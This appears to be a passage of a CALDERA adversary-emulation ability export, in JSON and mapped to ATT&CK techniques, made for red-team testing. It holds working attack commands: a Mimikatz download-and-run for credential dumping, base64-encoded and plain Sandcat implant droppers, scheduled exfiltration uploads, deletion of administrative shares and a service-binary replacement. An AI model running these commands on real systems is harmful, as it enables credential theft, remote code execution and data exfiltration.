                                "source": "remote.host.fqdn",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Ping a remote host to see if it is accessible",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Remote Host Ping",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.not_exists",
                "relationship_match": [
                    {
                        "source": "remote.host.fqdn",
                        "edge": "isAccessibleFrom"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "1b43591006b8e25b8df16ee52f0832bf",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "technique_id": "T1070.005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "net share ADMIN$ /UNLIMITED >nul 2>&1 && net share C$=C:\\ >nul 2>&1 && net share IPC$ >nul 2>&1"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Administrative shares are hidden network shares created by Microsoft’s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, “Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Remove Administrative Shares",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "df33cda361afedfcca27c84ed89d169a",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "technique_id": "T1070.005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "net share \\\\test\\share /delete",
                "name": "cmd",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Removes a Network Share utilizing the command_prompt\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Remove Network Share",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "3d378141044baec8dc52e9328da38405",
        "buckets": [
            "defense-evasion"
        ],
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
        "technique_id": "T1070.005",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "Remove-SmbShare -Name \\\\test\\share; Remove-FileShare -Name \\\\test\\share",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.atomic.app.parsers.atomic_powershell",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "validate_me",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Removes a Network Share utilizing PowerShell\n",
        "plugin": "atomic",
        "singleton": false,
        "delete_payload": true,
        "name": "Remove Network Share PowerShell",
        "tactic": "defense-evasion",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "52771610-2322-44cf-816b-a7df42b4c086",
        "buckets": [
            "persistence"
        ],
        "privilege": "",
        "technique_name": "Create or Modify System Process: Windows Service",
        "technique_id": "T1543.003",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nIf (Test-Path ($path + \".saved\")) {\n  Remove-Item $path;\n  Move-Item -Path ($path + \".saved\") -Destination $path\n}"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$s = Get-Service -Name #{host.service.modifiable};\nif ($s.status -ne 'Stopped') { Stop-Service $s };\n$exe = (Get-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Services\\#{host.service.modifiable}\").ImagePath.split()[0];\n$path = (Resolve-Path $exe).Path;\nCopy-Item -Path $path -Destination ($path + \".saved\");\nCopy-Item -Path \"C:\\Windows\\System32\\snmptrap.exe\" -Destination $path",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This is an example technique. snmptrap.exe should be changed in the command\nbelow with the new desired service binary. Depending on the value of\nhost.service.modifiable this ability can damage the target system.\n",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Replace a service binary with alternate binary",
        "tactic": "persistence",
        "repeatable": false,
        "requirements": [
            {
                "module": "plugins.stockpile.app.requirements.paw_provenance",
                "relationship_match": [
                    {
                        "source": "host.service.modifiable"
                    }
                ]
            }
        ]
    },
    {
        "ability_id": "fa4ed735-7006-4451-a578-b516f80e559f",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "technique_id": "T1018",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "nslookup #{remote.host.ip}",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.reverse_nslookup",
                        "parserconfigs": [
                            {
                                "edge": "has_ip",
                                "target": "remote.host.ip",
                                "source": "remote.host.fqdn",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Find hostname of remote IP in domain",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Reverse nslookup IP",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
        "buckets": [
            "credential-access"
        ],
        "privilege": "",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "technique_id": "T1003.001",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");\niex $result; Invoke-Mimikatz -DumpCreds",
                "name": "psh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.katz",
                        "parserconfigs": [
                            {
                                "edge": "has_password",
                                "target": "domain.user.password",
                                "source": "domain.user.name",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Run PowerKatz",
        "tactic": "credential-access",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "2f34977d-9558-4c12-abad-349716777c6b",
        "buckets": [
            "command-and-control"
        ],
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "technique_id": "T1105",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [
                    {
                        "description": "Deploy as a blue-team agent instead of red",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtc2VydmVyICRzZXJ2ZXIgLWdyb3VwIGJsdWUgJg=="
                    },
                    {
                        "description": "Download with a random name and start as a background process",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtc2VydmVyICRzZXJ2ZXIgJg=="
                    },
                    {
                        "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang).",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6I3thZ2VudC5leHRlbnNpb25zfSIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtc2VydmVyICRzZXJ2ZXIgLXY="
                    },
                    {
                        "description": "Download with GIST C2",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6Z2lzdCIgLUggImMyOmdpc3QiICRzZXJ2ZXIvZmlsZS9kb3dubG9hZCA+ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Y2htb2QgK3ggI3thZ2VudHMuaW1wbGFudF9uYW1lfTsuLyN7YWdlbnRzLmltcGxhbnRfbmFtZX0gLWMyIEdJU1QgLXY="
                    },
                    {
                        "description": "Deploy as a P2P agent with known peers included in compiled agent",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgLUggImdvY2F0LWV4dGVuc2lvbnM6cHJveHlfaHR0cCIgLUggImluY2x1ZGVQcm94eVBlZXJzOkhUVFAiICRzZXJ2ZXIvZmlsZS9kb3dubG9hZCA+ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Y2htb2QgK3ggI3thZ2VudHMuaW1wbGFudF9uYW1lfTsuLyN7YWdlbnRzLmltcGxhbnRfbmFtZX0gLXNlcnZlciAkc2VydmVyIC1saXN0ZW5QMlAgLXY="
                    }
                ],
                "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -v",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [
                    {
                        "description": "Deploy as a blue-team agent instead of red",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgYmx1ZSAm"
                    },
                    {
                        "description": "Download with a random name and start as a background process",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1zZXJ2ZXIgJHNlcnZlciAm"
                    },
                    {
                        "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang).",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczoje2FnZW50LmV4dGVuc2lvbnN9IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgPiAje2FnZW50cy5pbXBsYW50X25hbWV9O2NobW9kICt4ICN7YWdlbnRzLmltcGxhbnRfbmFtZX07Li8je2FnZW50cy5pbXBsYW50X25hbWV9IC1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgcmVkIC12"
                    },
                    {
                        "description": "Download with GIST C2",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczpnaXN0IiAtSCAiYzI6Z2lzdCIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtYzIgR0lTVCAtdg=="
                    },
                    {
                        "description": "Deploy as a P2P agent with known peers included in compiled agent",
                        "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4IjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6c2FuZGNhdC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAtSCAiZ29jYXQtZXh0ZW5zaW9uczpwcm94eV9odHRwIiAtSCAiaW5jbHVkZVByb3h5UGVlcnM6SFRUUCIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtc2VydmVyICRzZXJ2ZXIgLWxpc3RlblAyUCAtdg=="
                    }
                ],
                "command": "server=\"#{app.contact.http}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -server $server -group red -v",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [
                    {
                        "description": "Deploy as a blue-team agent instead of red",
                        "command": "JHNlcnZlcj0iaHR0cDovLzAuMC4wLjA6ODg4OCI7JHVybD0iJHNlcnZlci9maWxlL2Rvd25sb2FkIjskd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsInNhbmRjYXQuZ28iKTskZGF0YT0kd2MuRG93bmxvYWREYXRhKCR1cmwpO2dldC1wcm9jZXNzIHwgPyB7JF8ubW9kdWxlcy5maWxlbmFtZSAtbGlrZSAiQzpcVXNlcnNcUHVibGljXCN7YWdlbnRzLmltcGxhbnRfbmFtZX0uZXhlIn0gfCBzdG9wLXByb2Nlc3MgLWY7cm0gLWZvcmNlICJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiIC1lYSBpZ25vcmU7W2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiLCRkYXRhKSB8IE91dC1OdWxsO1N0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoIEM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSAtQXJndW1lbnRMaXN0ICItc2VydmVyICRzZXJ2ZXIgLWdyb3VwIGJsdWUiIC1XaW5kb3dTdHlsZSBoaWRkZW47"
                    },
                    {
                        "description": "Compile red-team agent with a comma-separated list of extensions (requires GoLang).",
                        "command": "JHNlcnZlcj0iaHR0cDovLzAuMC4wLjA6ODg4OCI7JHVybD0iJHNlcnZlci9maWxlL2Rvd25sb2FkIjskd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsInNhbmRjYXQuZ28iKTskd2MuSGVhZGVycy5hZGQoImdvY2F0LWV4dGVuc2lvbnMiLCAiI3thZ2VudC5leHRlbnNpb25zfSIpOyRkYXRhPSR3Yy5Eb3dubG9hZERhdGEoJHVybCk7Z2V0LXByb2Nlc3MgfCA/IHskXy5tb2R1bGVzLmZpbGVuYW1lIC1saWtlICJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUifSB8IHN0b3AtcHJvY2VzcyAtZjtybSAtZm9yY2UgIkM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSIgLWVhIGlnbm9yZTtbaW8uZmlsZV06OldyaXRlQWxsQnl0ZXMoIkM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSIsJGRhdGEpIHwgT3V0LU51bGw7U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggQzpcVXNlcnNcUHVibGljXCN7YWdlbnRzLmltcGxhbnRfbmFtZX0uZXhlIC1Bcmd1bWVudExpc3QgIi1zZXJ2ZXIgJHNlcnZlciAtZ3JvdXAgcmVkIiAtV2luZG93U3R5bGUgaGlkZGVuOw=="
                    },
                    {
                        "description": "Deploy as a P2P agent with known peers included in compiled agent",
                        "command": "JHNlcnZlcj0iaHR0cDovLzAuMC4wLjA6ODg4OCI7JHVybD0iJHNlcnZlci9maWxlL2Rvd25sb2FkIjskd2M9TmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOyR3Yy5IZWFkZXJzLmFkZCgiZmlsZSIsInNhbmRjYXQuZ28iKTskd2MuSGVhZGVycy5hZGQoImdvY2F0LWV4dGVuc2lvbnMiLCJwcm94eV9odHRwIik7JHdjLkhlYWRlcnMuYWRkKCJpbmNsdWRlUHJveHlQZWVycyIsIkhUVFAiKTskZGF0YT0kd2MuRG93bmxvYWREYXRhKCR1cmwpO2dldC1wcm9jZXNzIHwgPyB7JF8ubW9kdWxlcy5maWxlbmFtZSAtbGlrZSAiQzpcVXNlcnNcUHVibGljXCN7YWdlbnRzLmltcGxhbnRfbmFtZX0uZXhlIn0gfCBzdG9wLXByb2Nlc3MgLWY7cm0gLWZvcmNlICJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiIC1lYSBpZ25vcmU7W2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiLCRkYXRhKSB8IE91dC1OdWxsO1N0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoIEM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSAtQXJndW1lbnRMaXN0ICItc2VydmVyICRzZXJ2ZXIgLWdyb3VwIHJlZCAtbGlzdGVuUDJQIC12IiAtV2luZG93U3R5bGUgaGlkZGVuOw=="
                    }
                ],
                "command": "$server=\"#{app.contact.http}\";\n$url=\"$server/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$data=$wc.DownloadData($url);\nget-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\#{agents.implant_name}.exe\"} | stop-process -f;\nrm -force \"C:\\Users\\Public\\#{agents.implant_name}.exe\" -ea ignore;\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\#{agents.implant_name}.exe\",$data) | Out-Null;\nStart-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentList \"-server $server -group red\" -WindowStyle hidden;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "CALDERA's default agent, written in GoLang. Communicates through the HTTP(S) contact by default.",
        "plugin": "sandcat",
        "singleton": false,
        "delete_payload": true,
        "name": "Sandcat",
        "tactic": "command-and-control",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "47abe1f5-55a5-46cc-8cad-506dac8ea6d9",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "Network Service Scanning",
        "technique_id": "T1046",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "python3 scanner.py -i #{remote.host.ip}",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.scan",
                        "parserconfigs": [
                            {
                                "edge": "has_open_port",
                                "target": "remote.host.port",
                                "source": "remote.host.ip",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "scanner.py"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "python3 scanner.py -i #{remote.host.ip}",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.scan",
                        "parserconfigs": [
                            {
                                "edge": "has_open_port",
                                "target": "remote.host.port",
                                "source": "remote.host.ip",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [
                    "scanner.py"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "Use dropped scanner to find open popular ports",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Scan IP for ports",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9",
        "buckets": [
            "discovery"
        ],
        "privilege": "",
        "technique_name": "System Network Configuration Discovery",
        "technique_id": "T1016",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "./wifi.sh scan",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "wifi.sh"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "./wifi.sh scan",
                "name": "sh",
                "parsers": [],
                "payloads": [
                    "wifi.sh"
                ],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "./wifi.ps1 -Scan",
                "name": "psh",
                "parsers": [],
                "payloads": [
                    "wifi.ps1"
                ],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "View all potential WIFI networks on host",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Scan WIFI networks",
        "tactic": "discovery",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "110cea7a-5b03-4443-92ee-7ccefaead451",
        "buckets": [
            "exfiltration"
        ],
        "privilege": "",
        "technique_name": "Scheduled Transfer",
        "technique_id": "T1029",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "rm /tmp/mycron;\ncrontab /tmp/origcron;\nrm /tmp/origcron;"
                ],
                "build_target": null,
                "code": null,
                "platform": "linux",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "crontab -l > /tmp/origcron;\ncrontab -l > /tmp/mycron;\necho \"0 12 * * * curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\" >> /tmp/mycron;\ncrontab /tmp/mycron;",
                "name": "sh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "Unregister-ScheduledTask -TaskName \"Scheduled exfiltration\" -Confirm:$false;"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "$commandString = '$fieldName = \\\"#{host.dir.compress}\";\n$filePath = \\\"#{host.dir.compress}\";\n$url = \\\"#{server}/file/upload\\\";\nAdd-Type -AssemblyName \\\"System.Net.Http\\\";\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n\n$xRequestIdHeader = \\\"X-Request-Id\\\";\n$xRequestIdField = $env:COMPUTERNAME + \\\"-#{paw}\\\";\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add($xRequestIdHeader, $xRequestIdField);\n\n$userAgentHeader = \\\"User-Agent\\\";\n$userAgentField = \\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\";\n$client.DefaultRequestHeaders.Add($userAgentHeader, $userAgentField);\n$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();';\n\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"$commandString\";\n$trigger = New-ScheduledTaskTrigger -Once -At 12pm;\n\nRegister-ScheduledTask -TaskName \"Scheduled exfiltration\" -Trigger $trigger -Action $action;",
                "name": "psh",
                "parsers": [],
                "payloads": [],
                "uploads": []
            }
        ],
        "additional_info": {},
        "access": {},
        "description": "This ability exfiltrates the staged directory at a scheduled time.",
        "plugin": "stockpile",
        "singleton": false,
        "delete_payload": true,
        "name": "Scheduled Exfiltration",
        "tactic": "exfiltration",
        "repeatable": false,
        "requirements": []
    },
    {
        "ability_id": "316251ed-6a28-4013-812b-ddf5b5b007f8",
        "buckets": [
            "collection"
        ],
        "privilege": "",
        "technique_name": "Screen Capture",
        "technique_id": "T1113",
        "executors": [
            {
                "timeout": 60,
                "cleanup": [
                    "for i in {1..5}; do /bin/rm screen-$i.png; done;"
                ],
                "build_target": null,
                "code": null,
                "platform": "darwin",
                "language": null,
                "additional_info": {},
                "variations": [],
                "command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;",
                "name": "sh",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "target": "",
                                "source": "host.screenshot.png",
                                "custom_parser_vals": {}
                            }
                        ]
                    }
                ],
                "payloads": [],
                "uploads": []
            },
            {
                "timeout": 60,
                "cleanup": [
                    "$filePath = \"$HOME\\Desktop\\screenshot.png\"; if (Test-Path -Path $filePath) { del $filePath; };"
                ],
                "build_target": null,
                "code": null,
                "platform": "windows",
                "language": null,
                "additional_info": {},
                "variations": [],
